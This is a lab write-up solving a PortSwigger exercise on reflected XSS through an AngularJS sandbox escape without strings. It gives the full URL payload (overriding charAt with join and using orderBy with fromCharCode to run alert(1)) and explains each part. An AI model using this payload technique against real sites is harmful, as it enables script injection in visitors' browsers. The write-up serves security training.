<img width="853" height="261" alt="Screenshot_20261028_133700" src="https://github.com/user-attachments/assets/06f19a4e-5d5c-4072-8567-845ab6e4bb0f" />Link: [Reflected XSS with AngularJS sandbox escape without strings](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings)
Difficulty: Expert

# Recon
```
AngularJS is a JavaScript framework used to create dynamic and interactive web applications by updating webpage content based on user input and data
```
First I will try to understand the how the search box works, by inspecting the page source, I found the script for search box
```
 angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) { $scope.query = {}; var key = 'search'; $scope.query[key] = 'hello'; $scope.value = $parse(key)($scope.query); });

```
The script use `$parse` function to execute the key from the query `search` in the url. How about performing some arithmetic operations? By placing `&` at the end of the query help me execute the arithmetic equation
```
?search=1&1%2B1
```
<img width="853" height="261" alt="Screenshot_20261028_133700" src="https://github.com/user-attachments/assets/176468fa-3fd9-4d29-9a2f-e6a00dcb7592" />

Inspect the page script again to view what changed
```
<script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
                            $scope.query = {};
                            var key = 'search';
                            $scope.query[key] = '1';
                            $scope.value = $parse(key)($scope.query);
                            var key = '1+1';
                            $scope.query[key] = '';
                            $scope.value = $parse(key)($scope.query);
                        });</script>
```
So the script treat the query as a function to execute by using `$parse`, 
```
?search=1&alert()=1
```
The page embed the function `alert` but does not execute it due to the function scope. `alert` function is global scope, and what I input is just local, therefore, the script look for the local function called `alert` to execute it but in vain.

# Action
Reference to [XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
<img width="1240" height="122" alt="Screenshot_20261028_135745" src="https://github.com/user-attachments/assets/aa099ba9-d3a6-460a-a736-ed13e07caf8d" />

Here is how I inject this payload to the site

```
?search=1&toString().constructor.prototype.charAt%3d[].join;%20[1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```
By url-encoded the `=` I could trigger the payload 

## Breakdown the payload

```
toString().constructor.prototype.charAt%3d[].join
```

The `toString()` function creates a string, `constructor` accesses the Javascript `String` object. The `charAt` retrieves a specific character from a string, but in this payload, it is replaced with `join` which is normally used to combine elements of an array to form a string. 
`%3d` is `=` in url encoded form

```
[1,2]|orderBy
```
-> this is used as evaluation expression after it

```
fromCharCode(120,61,97,108,101,114,116,40,49,41)
```
which turns out to be 
`x=alert(l)`

```
120 = x
61 = =
97 = a
108 = l
101 = e
114 = r
116 = t
40 = (
49 = 1
41 = )
```


Happy Hacking!@$!@$
